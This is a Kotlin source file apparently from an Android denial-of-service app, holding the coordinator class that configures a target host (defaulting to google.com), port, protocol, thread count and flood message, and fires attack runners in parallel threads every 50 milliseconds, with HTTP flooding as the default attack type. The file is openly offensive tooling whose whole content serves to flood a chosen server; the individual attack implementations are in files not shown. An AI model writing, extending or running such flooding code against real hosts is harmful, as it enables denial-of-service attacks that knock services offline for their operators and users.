package com.shifthackz.android.attacker.attack.coordinator

import com.shifthackz.android.attacker.attack.contract.Attack
import com.shifthackz.android.attacker.attack.contract.AttackParam
import com.shifthackz.android.attacker.attack.contract.AttackProtocol
import com.shifthackz.android.attacker.attack.contract.AttackType
import com.shifthackz.android.attacker.attack.factory.AttackerFactory
import com.shifthackz.android.attacker.logging.LogCollector
import com.shifthackz.android.attacker.preference.Defaults
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import io.reactivex.rxjava3.core.Flowable
import io.reactivex.rxjava3.core.Observable
import io.reactivex.rxjava3.schedulers.Schedulers
import io.reactivex.rxjava3.subjects.PublishSubject
import java.util.concurrent.TimeUnit

class AttackCoordinatorImpl(
    private val factory: AttackerFactory,
    private val log: LogCollector
) : AttackCoordinator {

    private val runningSubject: PublishSubject<Boolean> = PublishSubject.create()

    private var type = AttackType.HTTP_FLOOD

    private var isRunning = false
        set(value) {
            runningSubject.onNext(value)
            when (value) {
                true -> log.collectMessage("Starting attack...")
                else -> log.collectMessage("Attack finished!")
            }
            field = value
        }

    private var target = "google.com"
    private var protocol = AttackProtocol.HTTP
    private var port = Defaults.PORT
    private var threadCount = 10
    private var timeout: Long = Defaults.TIMEOUT
    private var floodMsg: String = Defaults.FLOOD_MESSAGE

    private var attack: Attack? = null

    override fun start() {
        isRunning = true
        attack = factory.get(type, getParams())
        if (attack == null) {
            log.collectError(Exception("Attack not implemented"))
            stop()
        }
    }

    override fun stop() {
        isRunning = false
        attack = null
    }

    override fun setTarget(target: String) { this.target = target }

    override fun setPort(port: String) { this.port = port }

    override fun setType(type: AttackType) { this.type = type }

    override fun setThreadsCount(count: Int) { this.threadCount = count }

    override fun setProtocol(protocol: AttackProtocol) { this.protocol = protocol }

    override fun setConnectTimeout(timeout: Long) { this.timeout = timeout }

    override fun setFloodMessage(message: String) { this.floodMsg = message }

    override fun attack(): Observable<Int> = Observable
        .interval(50, TimeUnit.MILLISECONDS)
        .flatMap {
            Flowable
                .range(1, threadCount)
                .parallel(threadCount)
                .runOn(Schedulers.computation())
                .doOnNext { attack?.runner?.invoke() }
                .sequential()
                .subscribeOn(Schedulers.computation())
                .toObservable()
        }
        .takeUntil { !isRunning }

    override fun observeState(): Observable<Boolean> = runningSubject

    private fun getParams(): Map<AttackParam, Any> = mapOf(
        AttackParam.TARGET to target,
        AttackParam.PORT to port,
        AttackParam.PROTOCOL to protocol.protocol,
        AttackParam.TIMEOUT to timeout,
        AttackParam.FLOOD_MSG to floodMsg,
    )
}